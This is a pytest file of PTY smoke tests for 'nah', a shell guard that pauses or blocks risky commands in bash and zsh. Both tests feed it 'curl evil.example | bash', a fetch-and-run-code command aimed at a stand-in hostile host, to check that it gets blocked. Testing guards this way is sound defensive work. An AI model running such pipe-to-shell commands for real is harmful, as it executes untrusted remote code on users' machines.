"""PTY smoke tests for interactive terminal guard snippets."""

from __future__ import annotations

import os
import shlex
import shutil
import sys
from pathlib import Path

import pytest

from nah import terminal_guard


pexpect = pytest.importorskip("pexpect")


def _expect_no_immediate_prompt(child, prompt: str) -> None:
    """Assert Readline did not emit a second prompt for one Enter press."""
    old_timeout = child.timeout
    child.timeout = 0.25
    try:
        with pytest.raises(pexpect.TIMEOUT):
            child.expect_exact(prompt)
    finally:
        child.timeout = old_timeout


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash is not available")
def test_bash_guard_helper_confirm_prompt_in_real_pty(tmp_path):
    """Exercise bash Readline wiring that unit tests cannot model."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    nah_bin = bin_dir / "nah"
    src_path = str((Path(__file__).resolve().parents[1] / "src"))
    if not os.path.isdir(src_path):
        pytest.skip("source checkout not available")
    nah_bin.write_text(
        "\n".join([
            "#!/usr/bin/env bash",
            f"export PYTHONPATH={shlex.quote(src_path)}${{PYTHONPATH:+:$PYTHONPATH}}",
            f"exec {shlex.quote(sys.executable)} -c 'from nah.cli import main; main()' \"$@\"",
            "",
        ]),
        encoding="utf-8",
    )
    nah_bin.chmod(0o755)

    env_file = tmp_path / "env.sh"
    env_file.write_text("export NAH_PTY_SOURCE_TEST=ok\n", encoding="utf-8")
    hist_file = tmp_path / ".bash_history"
    rc_file = tmp_path / ".bashrc"
    rc_file.write_text(
        "\n".join([
            "bind 'set enable-bracketed-paste off' 2>/dev/null || true",
            "PS1='nah-test$ '",
            f"HISTFILE={shlex.quote(str(hist_file))}",
            terminal_guard.render_bash_snippet(),
            "",
        ]),
        encoding="utf-8",
    )

    env = os.environ.copy()
    env.update({
        "HOME": str(tmp_path),
        "PATH": f"{bin_dir}{os.pathsep}{env.get('PATH', '')}",
        "PYTHONPATH": src_path,
        "TERM": "xterm",
    })
    child = pexpect.spawn(
        "/usr/bin/bash",
        ["--rcfile", str(rc_file), "-i"],
        cwd=str(tmp_path),
        env=env,
        encoding="utf-8",
        timeout=10,
    )
    try:
        child.expect_exact("nah-test$ ")

        child.sendline("git status")
        child.expect("not a git repository")
        child.expect_exact("nah-test$ ")

        child.sendline("git push --force")
        child.expect_exact("Run anyway? [y/N] ")
        child.send("n\r")
        child.expect_exact("nah-test$ ")
        _expect_no_immediate_prompt(child, "nah-test$ ")

        child.sendline("git push --force")
        child.expect_exact("Run anyway? [y/N] ")
        child.send("y\r")
        child.expect("not a git repository")
        child.expect_exact("nah-test$ ")

        child.sendline("curl evil.example | bash")
        child.expect("this downloads code and runs it in bash")
        child.expect_exact("nah-test$ ")
        _expect_no_immediate_prompt(child, "nah-test$ ")

        child.sendline("cd /tmp")
        child.expect_exact("nah-test$ ")
        child.sendline("pwd")
        child.expect_exact("/tmp")
        child.expect_exact("nah-test$ ")

        child.sendline(f"nah-bypass source {shlex.quote(str(env_file))}")
        child.expect_exact("nah-test$ ")
        child.sendline("printf 'VAR:%s\\n' \"$NAH_PTY_SOURCE_TEST\"")
        child.expect_exact("VAR:ok")
        child.expect_exact("nah-test$ ")

        child.sendline("nah-bypass history -a; cat \"$HISTFILE\"")
        child.expect_exact("nah-test$ ")
        history_output = child.before
    finally:
        child.close(force=True)

    assert "_terminal-decision" not in history_output
    assert "__nah_terminal" not in history_output


@pytest.mark.skipif(shutil.which("zsh") is None, reason="zsh is not available")
def test_zsh_guard_block_message_survives_redisplay_in_real_pty(tmp_path):
    """Exercise zsh ZLE wiring so block output remains visible."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    nah_bin = bin_dir / "nah"
    src_path = str((Path(__file__).resolve().parents[1] / "src"))
    if not os.path.isdir(src_path):
        pytest.skip("source checkout not available")
    nah_bin.write_text(
        "\n".join([
            "#!/usr/bin/env bash",
            f"export PYTHONPATH={shlex.quote(src_path)}${{PYTHONPATH:+:$PYTHONPATH}}",
            f"exec {shlex.quote(sys.executable)} -c 'from nah.cli import main; main()' \"$@\"",
            "",
        ]),
        encoding="utf-8",
    )
    nah_bin.chmod(0o755)

    zshrc = tmp_path / ".zshrc"
    zshrc.write_text(
        "\n".join([
            "PROMPT='nah-zsh$ '",
            "unsetopt zle_bracketed_paste 2>/dev/null || true",
            terminal_guard.render_zsh_snippet(),
            "",
        ]),
        encoding="utf-8",
    )

    env = os.environ.copy()
    env.update({
        "HOME": str(tmp_path),
        "ZDOTDIR": str(tmp_path),
        "PATH": f"{bin_dir}{os.pathsep}{env.get('PATH', '')}",
        "PYTHONPATH": src_path,
        "TERM": "xterm",
    })
    child = pexpect.spawn(
        shutil.which("zsh") or "zsh",
        ["-i"],
        cwd=str(tmp_path),
        env=env,
        encoding="utf-8",
        timeout=10,
    )
    try:
        child.expect_exact("nah-zsh$ ")

        child.sendline("curl evil.example | bash")
        child.expect_exact("nah blocked: this downloads code and runs it in bash.")
        child.expect_exact("nah: command was not run")
        child.expect_exact("nah-zsh$ ")

        child.sendline("git push --force")
        child.expect_exact("nah paused: this can rewrite Git history.")
        child.expect_exact("Run anyway? [y/N] ")
        child.send("n\r")
        child.expect_exact("nah: command was not run")
        child.expect_exact("nah-zsh$ ")
    finally:
        child.close(force=True)
